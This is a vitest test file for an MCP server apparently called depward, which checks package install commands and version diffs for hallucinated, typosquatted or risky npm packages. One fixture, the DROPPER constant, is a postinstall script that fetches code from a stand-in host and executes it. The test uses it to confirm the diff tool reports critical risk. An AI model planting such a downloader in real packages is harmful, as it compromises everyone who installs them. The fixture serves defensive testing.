// The MCP server end to end, in process: a real MCP client talks to the server through
// createMcpHandler's fetch (no sockets), and the gate uses the recorded fixture
// registry. Testing approach: https://ts.sdk.modelcontextprotocol.io/v2/testing.html

import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { createFixtureRegistryClient } from "@depward/core/testing";
import { createGateData, preloadAnalyzer } from "@depward/gate";
import { Client, StreamableHTTPClientTransport } from "@modelcontextprotocol/client";
import { createMcpHandler } from "@modelcontextprotocol/server";
import { afterEach, beforeAll, beforeEach, describe, expect, test } from "vitest";
import { VERSION, createDepwardServer, type DepwardServerOptions } from "../src/index.ts";
import { fakeRegistry } from "./fake-registry.ts";

const FIXTURES = fileURLToPath(new URL("../../../fixtures/registry", import.meta.url));
const NOW = Date.parse("2026-11-10T12:00:00.000Z");
const data = createGateData(
  [{ name: "depward-fixture-stable", weeklyDownloads: 1_234_567 }],
  [{
    name: "depward-fixture-hallucinated",
    ecosystem: "npm",
    firstSeen: "2025-01-01",
    source: "https://example.invalid/report",
    suggestion: "depward-fixture-stable",
  }],
);

beforeAll(async () => {
  await preloadAnalyzer();
});

let cwd: string;
let client: Client | undefined;
beforeEach(async () => {
  cwd = await mkdtemp(join(tmpdir(), "depward-mcp-"));
});
afterEach(async () => {
  await client?.close();
  client = undefined;
  await rm(cwd, { recursive: true, force: true });
});

async function connect(extra: Partial<DepwardServerOptions> = {}): Promise<Client> {
  const opts: DepwardServerOptions = {
    registry: createFixtureRegistryClient(FIXTURES), cwd, version: VERSION, gate: { data, now: () => NOW }, ...extra,
  };
  const handler = createMcpHandler(() => createDepwardServer(opts));
  const transport = new StreamableHTTPClientTransport(new URL("http://test.local/mcp"), {
    fetch: (url, init) => handler.fetch(new Request(url, init)),
  });
  client = new Client({ name: "depward-test", version: "1.0.0" }, { versionNegotiation: { mode: "auto" } });
  await client.connect(transport);
  return client;
}

interface ToolResult {
  content: { type: string; text?: string }[];
  structuredContent?: Record<string, unknown>;
  isError?: boolean;
}

async function call(c: Client, name: string, args: Record<string, unknown>): Promise<ToolResult> {
  return (await c.callTool({ name, arguments: args })) as ToolResult;
}
const text = (r: ToolResult): string => r.content.map((b) => b.text ?? "").join("\n");

describe("tools/list", () => {
  test("advertises every tool as read-only, with input and output schemas", async () => {
    const { tools } = await (await connect()).listTools();
    expect(tools.map((t) => t.name).toSorted()).toEqual(["check_install_command", "check_packages", "diff_versions"]);
    for (const t of tools) {
      expect(t.annotations).toMatchObject({ readOnlyHint: true, destructiveHint: false, openWorldHint: true });
      expect(t.outputSchema).toMatchObject({ type: "object" });
      expect(t.description).toMatch(t.name === "diff_versions" ? /On "critical", do not update/ : /deny/);
    }
    expect(tools.find((t) => t.name === "diff_versions")?.inputSchema).toMatchObject({ type: "object", required: ["name", "from", "to"] });
    const cmd = tools.find((t) => t.name === "check_install_command");
    expect(cmd?.description).toMatch(/^Call this BEFORE running any shell command that installs/);
    expect(cmd?.inputSchema).toMatchObject({ type: "object", required: ["command"] });
  });

  test("the server's instructions tell the agent when to call it", async () => {
    const c = await connect();
    expect(c.getInstructions()).toMatch(/Call check_install_command BEFORE running any command that installs/);
    expect(c.getInstructions()).toMatch(/call diff_versions/);
  });
});

describe("check_install_command", () => {
  test("deny: a hallucinated name, with the reason and the suggestion in the text", async () => {
    const r = await call(await connect(), "check_install_command", { command: "npm i depward-fixture-hallucinated" });
    expect(r.isError).toBeFalsy();
    expect(text(r)).toMatch(/^depward: deny \(1 package checked\)\n- deny depward-fixture-hallucinated@latest: known-hallucinated-name — /);
    expect(text(r)).toContain("Suggested instead of depward-fixture-hallucinated@latest: depward-fixture-stable");
    expect(text(r)).toMatch(/\nDo not run this install\. Use a suggested alternative, or ask the user\.$/);
    expect(r.structuredContent).toMatchObject({ decisionVersion: 1, tool: { name: "depward", version: VERSION }, action: "deny" });
  });

  test("deny: a package first published 2 days ago", async () => {
    const r = await call(await connect(), "check_install_command", { command: "pnpm add depward-fixture-fresh" });
    expect(r.structuredContent?.["action"]).toBe("deny");
  });

  test("allow: a popular, stable package", async () => {
    const r = await call(await connect(), "check_install_command", { command: "npm install depward-fixture-stable" });
    expect(r.structuredContent?.["action"]).toBe("allow");
    expect(text(r)).toBe("depward: allow (1 package checked)\ndepward found nothing that blocks this install.");
  });

  test("ask: a typosquat, with the real name suggested", async () => {
    const r = await call(await connect(), "check_install_command", { command: "npm i depward-fixture-stabel" });
    expect(r.structuredContent?.["action"]).toBe("ask");
    expect(text(r)).toContain("Suggested instead of depward-fixture-stabel@2.0.1: depward-fixture-stable");
    expect(text(r)).toMatch(/let them decide before installing\.$/);
  });

  test("a command with nothing to install", async () => {
    const r = await call(await connect(), "check_install_command", { command: "git status" });
    expect(text(r)).toBe("depward: allow (nothing to install)\ndepward found nothing that blocks this install.");
  });

  test("an empty command is rejected by the input schema", async () => {
    const r = await call(await connect(), "check_install_command", { command: "" });
    expect(r.isError).toBe(true);
    expect(text(r)).toMatch(/Input validation error/);
  });
});

describe("check_packages", () => {
  test("checks each spec and returns per-package decisions", async () => {
    const r = await call(await connect(), "check_packages", { specs: ["depward-fixture-stable@^2", "depward-fixture-missing"] });
    expect(r.structuredContent?.["action"]).toBe("deny");
    const packages = r.structuredContent?.["packages"] as { name: string; version: string | null; action: string }[];
    expect(packages.map((p) => [p.name, p.version, p.action])).toEqual([
      ["depward-fixture-stable", "2.0.0", "allow"],
      ["depward-fixture-missing", null, "deny"],
    ]);
  });

  test("an invalid spec is a tool error, not a crash", async () => {
    const r = await call(await connect(), "check_packages", { specs: ["Not A Name"] });
    expect(r.isError).toBe(true);
    expect(text(r)).toMatch(/^depward: INVALID_ARGUMENT: /);
  });

  test("more than 50 specs are rejected by the input schema", async () => {
    const r = await call(await connect(), "check_packages", { specs: Array.from({ length: 51 }, (_, i) => `p${i}`) });
    expect(r.isError).toBe(true);
  });
});

describe("config", () => {
  test("the project config is read on every call", async () => {
    const c = await connect();
    expect((await call(c, "check_packages", { specs: ["depward-fixture-stable"] })).structuredContent?.["action"]).toBe("allow");
    await writeFile(join(cwd, "depward.config.json"), JSON.stringify({ deny: ["depward-fixture-stable"] }));
    const r = await call(c, "check_packages", { specs: ["depward-fixture-stable"] });
    expect(r.structuredContent?.["action"]).toBe("deny");
    expect(text(r)).toContain("denylisted");
  });

  test("configPath reads another file", async () => {
    await writeFile(join(cwd, "strict.json"), JSON.stringify({ policy: { "non-registry-source": "deny" } }));
    const r = await call(await connect({ configPath: "strict.json" }), "check_install_command", { command: "npm i github:example/repo" });
    expect(r.structuredContent?.["action"]).toBe("deny");
  });

  test("an invalid config is a tool error", async () => {
    await writeFile(join(cwd, "depward.config.json"), JSON.stringify({ denny: [] }));
    const r = await call(await connect(), "check_packages", { specs: ["depward-fixture-stable"] });
    expect(r.isError).toBe(true);
    expect(text(r)).toMatch(/^depward: INVALID_CONFIG: /);
  });
});

const DROPPER = `const https = require("https");
const { spawn } = require("child_process");
https.get("https://cdn.example.invalid/stage2.js", (res) => {
  let body = "";
  res.on("data", (c) => (body += c));
  res.on("end", () => spawn(process.execPath, ["-e", body]));
});
`;

const diffRegistry = () => fakeRegistry({
  "fx-pkg": {
    "1.0.0": {},
    "1.0.1": { files: { "index.js": "module.exports = 1;", "install.js": DROPPER }, scripts: { postinstall: "node install.js" } },
    "1.1.0": { files: { "index.js": "module.exports = 2;" } },
  },
});

describe("diff_versions", () => {
  test("critical: a patch that adds a downloading postinstall", async () => {
    const r = await call(await connect({ registry: diffRegistry() }), "diff_versions", { name: "fx-pkg", from: "1.0.0", to: "1.0.1" });
    expect(r.isError).toBeFalsy();
    const lines = text(r).split("\n");
    expect(lines[0]).toBe("depward: risk critical for fx-pkg 1.0.0 → 1.0.1");
    expect(lines.some((l) => l.startsWith("- high diff-new-install-script: "))).toBe(true);
    expect(lines.at(-1)).toBe("Do not update. Stay on 1.0.0, or ask the user.");
    expect(r.structuredContent).toMatchObject({ reportVersion: 1, tool: { name: "depward", version: VERSION }, risk: "critical" });
    const pkg = ((r.structuredContent?.["packages"] ?? []) as { kind: string; from: string; to: string; findings: { id: string }[]; delta: { scripts: unknown } }[])[0];
    expect(pkg).toMatchObject({ kind: "updated", from: "1.0.0", to: "1.0.1" });
    expect(pkg?.findings.map((f) => f.id)).toContain("diff-new-network-in-non-network-pkg");
    expect(pkg?.delta.scripts).toEqual({ postinstall: { to: "node install.js" } });
  });

  test("info: an ordinary update", async () => {
    const r = await call(await connect({ registry: diffRegistry() }), "diff_versions", { name: "fx-pkg", from: "1.0.0", to: "1.1.0" });
    expect(text(r).split("\n")).toEqual(["depward: risk info for fx-pkg 1.0.0 → 1.1.0", "depward found nothing in this update that needs attention."]);
  });

  test("the project config applies: allowed findings are shown but not counted", async () => {
    await writeFile(join(cwd, "depward.config.json"), JSON.stringify({ allow: ["fx-pkg"] }));
    const r = await call(await connect({ registry: diffRegistry() }), "diff_versions", { name: "fx-pkg", from: "1.0.0", to: "1.0.1" });
    expect(r.structuredContent?.["risk"]).toBe("info");
    expect(text(r)).toContain("findings allowed by the project's config (not counted).");
  });

  test("a missing version is reported in the result, not as a tool error", async () => {
    const r = await call(await connect({ registry: diffRegistry() }), "diff_versions", { name: "fx-pkg", from: "1.0.0", to: "9.9.9" });
    expect(r.isError).toBeFalsy();
    expect(text(r)).toContain("- lookup failed (NOT_FOUND): fx-pkg@9.9.9 is not in the registry");
    expect(text(r).split("\n").at(-1)).toBe("Part of the diff could not be checked. Tell the user before updating.");
  });

  test("an invalid name is a tool error, and an empty one fails the input schema", async () => {
    const c = await connect({ registry: diffRegistry() });
    const bad = await call(c, "diff_versions", { name: "../-/whoami", from: "1.0.0", to: "1.0.1" });
    expect(bad.isError).toBe(true);
    expect(text(bad)).toMatch(/^depward: INVALID_ARGUMENT: invalid package name/);
    const empty = await call(c, "diff_versions", { name: "", from: "1.0.0", to: "1.0.1" });
    expect(empty.isError).toBe(true);
    expect(text(empty)).toMatch(/Input validation error/);
  });
});

describe("the update path (M3.6)", () => {
  test("check_packages diffs a package locked in the project at another version", async () => {
    const registry = diffRegistry();
    const integrity = (await registry.versionMeta("fx-pkg", "1.0.0"))?.dist.integrity;
    await writeFile(join(cwd, "package-lock.json"), JSON.stringify({
      name: "root", lockfileVersion: 3,
      packages: { "": { name: "root" }, "node_modules/fx-pkg": { version: "1.0.0", resolved: "https://registry.npmjs.org/fx-pkg/-/fx-pkg-1.0.0.tgz", integrity } },
    }));
    const r = await call(await connect({ registry, gate: { data: createGateData([], []), now: () => NOW } }), "check_packages", { specs: ["fx-pkg@1.0.1"] });
    expect(r.structuredContent?.["action"]).toBe("deny");
    expect(((r.structuredContent?.["packages"] ?? []) as { update: unknown }[])[0]?.update).toEqual({ from: "1.0.0", lockfile: "package-lock.json" });
    expect(text(r)).toContain("deny fx-pkg@1.0.1 (update from 1.0.0): diff-new-install-script");
  });
});
